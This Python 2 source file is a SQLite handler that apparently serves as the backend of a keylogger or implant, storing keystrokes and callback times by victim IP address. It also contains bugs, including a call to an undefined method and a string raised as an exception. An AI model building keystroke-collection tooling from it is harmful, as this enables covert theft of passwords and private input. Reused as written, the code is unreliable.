"""
Database handler object
Author: Micah Martin (knif3)
"""

from toolbox import validate_ip as vip
from os.path import exists
import sqlite3
class Database(object):
    """
    Database handler object. Abstracts alot of SQLite stuff
    """
    def __init__(self, location, script=None):
        # The location of the DB
        self.location = location
        # Check if the file exists BEFORE the connect creates it
        ex = exists(location)
        self.conn = sqlite3.connect(location, check_same_thread=False)
        self.cur = self.conn.cursor()
        # If it doesnt exist, run the script on it
        if not ex:
            print "Creating DB"
            self.create(script)
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

    def close(self):
        """
        Close the connection
        """
        self.conn.close()

    def create(self, script=None):
        """
        Create the database with the given script
        """
        self.location = "db_servers.sqlite"
        # set the location of the script
        if script is None:
            script = "build_db.sql"
        
        # Read the build script
        fil = open(script)
        build_script = fil.read()
        fil.close()
        # Build the tables
        self.cur.executescript(build_script)
        # Commit the new script
        self.conn.commit()

    def qry(self, qry):
        """
        Execute an arbitrary query
        """
        self.cur.execute(qry)
        return self.cur.fetchall()

    def newcur(self, cursor):
        """
        Format the cursor output as json
        """
        output = []
        cols = [c[0] for c in cursor.description]
        for i in cursor.fetchall():
            d = {}
            for j in range(len(cols)):
                d[cols[j]] = i[j]
            output += [d]
        return output

    def add_keystroke(self, ip, keystroke):
        """
        Add a keystroke entry to the DB
        """
        # Make sure we are using a valid IP address
        ip = ip.strip()
        if not vip(ip):
            raise "Not a valid IP"
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (ip,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (ip,keystroke))
        # Write the changes to teh DB
        self.conn.commit()

    def GENERIC(self, table, col, val):
        """
        Use this function as a template for new query commands
        """
        qry = "SELECT * FROM {} WHERE {} = ?;".format(table, col)
        results = self.handle_query(qry, val)
        if not results:
            return  {}
        else:
            return results[0]

